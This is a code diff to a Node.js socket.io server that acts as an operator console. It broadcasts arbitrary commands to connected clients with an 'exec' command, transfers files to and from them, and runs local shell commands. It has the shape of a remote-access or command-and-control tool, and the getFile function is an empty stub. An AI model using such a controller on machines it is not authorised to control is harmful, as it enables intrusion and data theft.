@@ -36,11 +36,15 @@ function newConnection(socket){
         //console.log("Client has disconnected");
     });
 
+    socket.on('commandReturn', function(text){
+        console.log(text);
+    });
+
     socket.emit('handshake');
 }
 
 function terminal(){
-    rl.question('Command: ', function (answer) {
+    rl.question('> ', function (answer) {
         if (answer == 'exit') return rl.close(); //closing RL and returning from function.
         executeCommand(answer);
         terminal();
@@ -54,6 +58,10 @@ function executeCommand(command){
     var quotes = command.split('"');
     //console.log(quotes[1], quotes[3], quotes[5]);
 
+    if(clientIndex >= clients.length){
+        console.log("No device found");
+        return;
+    }
 
     if(words[0] == "list"){
         showClients();
@@ -61,31 +69,37 @@ function executeCommand(command){
     else if(words[0] == "cls"){
         cls();
     }
-    else if(words[0] == "send"){ // Example: send number "command"
+    else if(words[0] == "exec"){ // Example: exec number "command"
         sendCommand(clientIndex, quotes[1]);
     }
     else if(words[0] == "shell"){
         shell.exec(quotes[1]);
     }
-    else if (words[0] == "sendfile"){ // Example: sendfile number "C:/etc/example.jpg" "root/users/"
+    else if (words[0] == "sendfile"){ // Example: sendfile number "C:/tc/example.jpg" "root/users/"
         var localPath = quotes[1];
         var temp = localPath.split('/');
         var fileName = temp[temp.length-1];
-        var targetPath = quotes[3];
+        var clientPath = quotes[3];
 
-        console.log(clientIndex, localPath, fileName, targetPath);
-        sendFile(clientIndex, localPath, fileName, targetPath); 
+        sendFile(clientIndex, localPath, fileName, clientPath);
     }
-    else if (words[0] == "getfile"){
-        getFile();
+    else if (words[0] == "getfile"){ // Example: getfile number "root/users/example.jpg" "C:/tc/"
+        var localPath = quotes[3];
+        var clientPath = quotes[1];
+        var temp = clientPath.split('/');
+        var fileName = temp[temp.length-1];
+
+        getFile(clientIndex, localPath, fileName, clientPath);
+
     }
+    // curl 'https://api.ipify.org?format=json'
     else{
         console.log("Command not found");
     }
 }
 
 function sendCommand(clientIndex, command){
-    console.log("Enviando");
+    //console.log("Enviando");
     if(clientIndex == "all"){
         io.sockets.emit('command', command);
     }
@@ -118,15 +132,15 @@ function cls(){
     console.log('\033c');
 }
 
-function sendFile(clientIndex, localPath, fileName, targetPath){
+function sendFile(clientIndex, localPath, fileName, clientPath){
 
     if(clientIndex == "all"){
         var delivery = dl.listen(io.sockets);
-        io.sockets.emit('clientWritePath', targetPath);
+        io.sockets.emit('clientWritePath', clientPath);
     }
     else{
         var delivery = dl.listen(clients[clientIndex]);
-        clients[clientIndex].emit('clientWritePath', targetPath)
+        clients[clientIndex].emit('clientWritePath', clientPath)
     }
     
     delivery.connect();
@@ -143,7 +157,8 @@ function sendFile(clientIndex, localPath, fileName, targetPath){
     });
 }
 
-function getFile(){
+function getFile(clientIndex, localPath, fileName, clientPath){
+    
 
 }
 
